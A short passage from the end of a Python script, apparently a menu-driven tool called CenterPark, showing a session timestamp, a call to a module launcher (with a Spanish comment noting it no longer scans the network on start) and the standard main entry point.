        self.session_start = datetime.now()
        
        # NUEVO COMPORTAMIENTO: mostrar menú de módulos (sin escanear la red)
        self.modulo_launcher()


def main():
    """Función principal"""
    park = CenterPark()
    park.run()


if __name__ == "__main__":
    main()
